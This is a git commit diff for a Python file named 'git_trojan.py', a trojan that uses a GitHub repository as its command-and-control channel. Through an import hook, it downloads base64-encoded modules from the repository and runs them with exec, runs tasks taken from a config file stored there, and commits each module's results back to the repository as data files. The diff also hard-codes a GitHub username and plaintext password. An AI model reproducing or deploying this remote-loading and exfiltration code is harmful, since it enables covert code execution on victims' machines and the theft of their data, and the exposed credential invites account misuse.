aca0aa7e0217097eed5ddd6740635fdac936a0c9
Dannis <tuhaibo511@126.com>
2017-11-19 14:29:16 +0800

    Project Name: Trojan Author: Haibo Tu
    Commit Msg: Add whole trojan project file.
    Feature or Bugfix: Feature
    
    	modified:   git_trojan.py
    
    Change-Id: I752982752836b0ae5f1df9707ed5555b4e91f96c

--- git_trojan.py
+++ git_trojan.py
@@ -10,10 +10,10 @@ import os
 
 from gittle import Gittle
 from gittle import GittleAuth
+from github3 import login
 
 repo_path = '/tmp/gittle_bare'
-#repo_url = 'ssh://115.159.57.117:29418/Trojan'
-repo_url = "http://115.159.57.117:8081/Trojan"
+repo_url = "https://github.com/HaiboTu/Trojan.git"
 trojan_id = "abc"
 
 trojan_config	 = "%s.json" % trojan_id
@@ -21,7 +21,6 @@ data_path		 = "data/%s/" % trojan_id
 trojan_modules	 = []
 configured		 = False
 task_queue		 = Queue.Queue()
-repo			 = None
 
 class Gitimporter(object):
 	def __init__(self):
@@ -33,55 +32,51 @@ class Gitimporter(object):
 			new_library = get_file_contents("%s.py" % fullname)
 
 			if new_library is not None:
-				self.current_module_code = new_library
+				self.current_module_code = base64.b64decode(new_library)
 				return self
 
 		return None
-	
+
 	def load_module(self, name):
 		module = imp.new_module(name)
 		exec self.current_module_code in module.__dict__
 		sys.modules[name] = module
 
 		return module
-		
+
+def create_work_path():
+	for root, dirs, files in os.walk(repo_path, topdown=False):
+		for name in files:
+			os.remove(os.path.join(root, name))
+		for name in dirs:
+			os.rmdir(os.path.join(root, name))
+
+	if not os.path.exists(repo_path):
+		os.mkdir(repo_path)
+
+	if not os.path.exists("%s/.git" %repo_path) :
+		Gittle.init(repo_path)
+
+	return None
+
 def connect_to_server():
 
-#	Gittle.init(path)
-	global repo
+	gh = login(username = "HaiboTu", password = "apple@511126")
+	repo = gh.repository("Haibotu", "trojan")
+	branch = repo.branch("master")
 
-	repo = Gittle(repo_path, origin_uri = repo_url)
-
-
-	#Authentication with RSA private key
-	#key_file = open('/home/tuhaibo/.ssh/id_rsa')
-	#key = key_file.readlines()
-
-	#repo.auth(pkey = key_file)
-
-	#repo = Gittle.clone(repo_url, repo_path, auth = auth)
-	repo.pull()
-
-	return repo
+	return gh, repo, branch
 
 def get_file_contents(filepath):
-#repo = connect_to_server()
 
-#	repo.pull()
-	
-	print "[*] filepath %s.\n" %filepath
-	filename = os.path.basename(filepath)
+	gh, repo, branch = connect_to_server()
+	tree = branch.commit.commit.tree.recurse()
 
-	for root, dirs, files in os.walk(repo_path):
-		if filename in files:
-			full_path = os.path.join(root, filepath)
-
-			f = open(full_path)
-
-			contents = f.readlines()
-			contents = ''.join(contents).strip('\n')
-
-			return contents 
+	for filename in tree.tree:
+		if filepath in filename.path:
+			print "[*] Found file %s" % filepath
+			blob = repo.blob(filename._json_data['sha'])
+			return blob.content
 
 	return None
 
@@ -89,43 +84,33 @@ def get_trojan_config():
 	global configured
 
 	config_json = get_file_contents(trojan_config)
-	config		= json.loads(config_json)
+	config		= json.loads(base64.b64decode(config_json))
 	configured	= True
 
 	for task in config:
 		if task['module'] not in sys.modules:
 			exec("import %s" % task['module'])
 
-	return config	
+	return config
 
 def store_module_result(data):
-#	repo = connect_to_server()
+	gh, repo, branch = connect_to_server()
 
 	remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))
 
-	repo.stage()
-
-	repo.commit(name = "ratel", email = "ratel@friedco.de", message = "new \
-		   	data commit")
-
-	repo.auth("Dennis")
-#repo.auth(username = "Dennis")
-
-	repo.push()
+	repo.create_file(remote_path, "Commit message", data)
 
 	return
 
 def module_runner(module):
 	task_queue.put(1)
 	result = sys.modules[module].run()
-#	task_queue.get()
 
 	store_module_result(result)
 
 	return
 
 sys.meta_path = [Gitimporter()]
-connect_to_server();
 
 while True:
 	if task_queue.empty():
@@ -135,8 +120,7 @@ while True:
 			t = threading.Thread(target = module_runner, args =
 					(task['module'],))
 			t.start()
-			break
-#			time.sleep(random.randint(1, 10))
+			time.sleep(random.randint(1, 10))
 
 	sys.exit(0)
 
